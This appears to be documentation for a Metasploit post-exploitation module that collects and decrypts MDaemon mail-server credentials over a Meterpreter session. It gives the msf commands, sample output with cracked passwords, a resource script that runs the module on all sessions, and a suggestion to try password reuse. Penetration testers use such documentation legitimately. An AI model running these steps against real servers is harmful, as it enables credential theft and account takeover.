## Vulnerable Application

Download and install the email server: [www.altn.com](http://www.altn.com/Downloads/MDaemon-Mail-Server-Free-Trial/)

You require a valid licence, but there's a demo for 30 days.

### Verified

1. AWS --> Microsoft Windows Server 2012 R2 Base - ami-8d0acfed Instance: t2.micro @ July-August 2016 x64 bits with meterpreter 64 bits.
2. AWS --> Microsoft Windows Server 2012 R2 Base - ami-8d0acfed Instance: t2.micro @ July-August 2016 x64 bits with meterpreter 32 bits. Worked,  but couldn't find the path through Register.
3. VM --> Microsoft Windows 7 on VMWare.

## Verification Steps

1. Get a meterpreter on a windows machine that has MDaemon installed.
2. Load the module: `use post/windows/gather/credentials/mdaemon_cred_collector`
3. Set the correct session on the module.
  1. Optional: you can add the remote path of the installation, especially if the software is installed on a strange path and the module can't find it..
4. Run the module and enjoy the loot.

## Options

  **RPATH**
  The remote path of the MDaemon installation.
  If the machine runs on 64bits and the meterpreter is 32 bits, it won't be able to find the installation path in the registry, but it will search some default paths. If it is installed on a non-default path you can give the RPATH and it will work.

## Scenarios

**Normal mode**
```
msf > use post/windows/gather/credentials/mdaemon_cred_collector 
msf > set SESSION 1
msf > exploit 
```

Output:

```
[+] Configuration file found: C:\MDaemon\App\userlist.dat
[+] Found MDaemons on WIN-F7ANP3JL4GJ via session ID: 1
[*]     Extracted: MDaemon:p0%AhBxvs4IZ
[*]     Extracted: webmaster:Manuel123.
[*] SMTP credentials saved in: /root/.msf4/loot/20160831194802_default_127.0.0.1_MDaemon.smtp_ser_754168.txt
[*]     Extracted: webmaster:Manuel123.
[*] POP3 credentials saved in: /root/.msf4/loot/20160831194802_default_127.0.0.1_MDaemon.pop3_ser_608271.txt
[*]     Extracted: webmaster:Manuel123.
[*] IMAP credentials saved in: /root/.msf4/loot/20160831194802_default_127.0.0.1_MDaemon.imap_ser_769125.txt
[*] Post module execution completed
```

**Verbose true**
```
msf > use post/windows/gather/credentials/mdaemon_cred_collector 
msf > set SESSION 1
msf > set verbose true
msf > exploit 
```

Output:

```
[*] Searching MDaemon installation at C:
[*] Found MDaemon installation at C:
[*] Searching MDaemon installation at C:
[*] Found MDaemon installation at C:
[*] Searching MDaemon installation at C:\Program Files
[*] Searching MDaemon installation at C:\Program Files (x86)
[*] Searching MDaemon installation at C:\Program Files
[*] Checking for Userlist in MDaemons directory at: C:\MDaemon\App
[+] Configuration file found: C:\MDaemon\App\userlist.dat
[+] Found MDaemons on WIN-F7ANP3JL4GJ via session ID: 1
[*] Downloading UserList.dat file to tmp file: SFJOXMHZEFWA
[*] Cracking xJiKYdun7OvjVLnM
[*] Password p0%AhBxvs4IZ
[*] Cracking ocnTldjRpaejTg==
[*] Password Manuel123.
[*] Collected the following credentials:
[*]     Usernames: 2
[*]     Passwords: 2
[*] Deleting tmp file: SFJOXMHZEFWA
[*]     Extracted: MDaemon:p0%AhBxvs4IZ
[*]     Extracted: webmaster:Manuel123.
[*] SMTP credentials saved in: /root/.msf4/loot/20160831194819_default_127.0.0.1_MDaemon.smtp_ser_114741.txt
[*]     Extracted: webmaster:Manuel123.
[*] POP3 credentials saved in: /root/.msf4/loot/20160831194819_default_127.0.0.1_MDaemon.pop3_ser_369240.txt
[*]     Extracted: webmaster:Manuel123.
[*] IMAP credentials saved in: /root/.msf4/loot/20160831194819_default_127.0.0.1_MDaemon.imap_ser_028427.txt
[*] Post module execution completed
```

### Scenarios Extended
**Run on all sessions**
If you wish to run the post against all sessions from framework, here is how:

1. Create the following resource script:
```
framework.sessions.each_pair do |sid, session|
  run_single("use post/windows/gather/credentials/mdaemon_cred_collector")
  run_single("set SESSION #{sid}")
  run_single("run")
end
```
2. At the msf prompt, execute the above resource script:
`msf > resource path-to-resource-script`

**Meterpreter on email server**

If you have a meterpreter running on a server that has MDaemon installed, run the module and you will get all the users and passwords of the email server. Quite useful for trying password reuse and/or checking the strength of the passwords.

Note: MDaemon can store the passwords on a database, in that case the module won't work, but you can search for the database location, username and password and still get them :)

